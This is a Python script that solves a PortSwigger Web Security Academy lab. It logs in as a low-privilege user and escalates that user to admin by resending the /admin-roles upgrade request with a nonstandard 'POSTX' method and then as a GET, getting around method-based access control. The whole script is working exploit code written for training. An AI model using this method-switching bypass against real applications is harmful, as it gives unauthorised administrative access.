# Lab: Method-based access control can be circumvented
# https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
response = session.get(f"{base_url}/login")
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# change http method from post to postx
change_request_url = f"{base_url}/admin-roles"
change_request_data = {"username": "wiener", "action": "upgrade"}
response = session.request("POSTX", change_request_url, data=change_request_data)

exploit_url = f"{base_url}/admin-roles?username=wiener&action=upgrade"
exploit_response = session.get(exploit_url)
if "Congratulations" in exploit_response.text:
    print("Lab solved")
else:
    print("Exploit did not work")